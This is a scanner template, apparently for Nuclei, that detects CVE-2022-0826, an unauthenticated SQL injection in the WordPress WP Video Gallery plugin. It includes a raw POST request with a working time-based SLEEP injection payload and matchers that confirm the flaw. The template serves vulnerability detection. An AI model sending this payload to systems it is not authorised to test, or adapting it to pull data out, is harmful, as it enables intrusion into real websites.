id: CVE-2022-0826
info:
  name: WordPress WP Video Gallery <=1.7.1 - SQL Injection
  author: theamanrawat
  severity: critical
  description: WordPress WP Video Gallery plugin through 1.7.1 is vulnerable to SQL
    injection, which can potentially enable attackers to obtain sensitive information
    and execute unauthorized administrative operations.
  reference:
  - https://wpscan.com/vulnerability/7a3eed3b-c643-4e24-b833-eba60ab631c5
  - https://wordpress.org/plugins/wp-video-gallery-free/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-0826
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-0826
    cwe-id: CWE-89
  metadata:
    verified: true
    impact: The CVE-2022-0826 vulnerability in the WordPress WP Video Gallery plugin
      could allow an attacker to inject SQL code, resulting in potential data breaches,
      alterations, and unauthorized access to administrative operations on the affected
      website.
    recommendation: It is recommended to update WordPress WP Video Gallery plugin
      to the latest version to prevent SQL injection attacks.
  tags: cve2022,wp-plugin,wpscan,cve,wordpress,wp,sqli,wp-video-gallery-free,unauth
requests:
- raw:
  - '@timeout: 15s

    POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    action=wp_video_gallery_ajax_add_single_youtube&url=http://example.com/?x%26v=1%2522
    AND (SELECT 1780 FROM (SELECT(SLEEP(6)))uPaz)%2523

    '
  matchers:
  - type: dsl
    dsl:
    - duration>=6
    - status_code == 200
    - contains(content_type, "text/html")
    - contains(body, "Registred videos :")
    condition: and
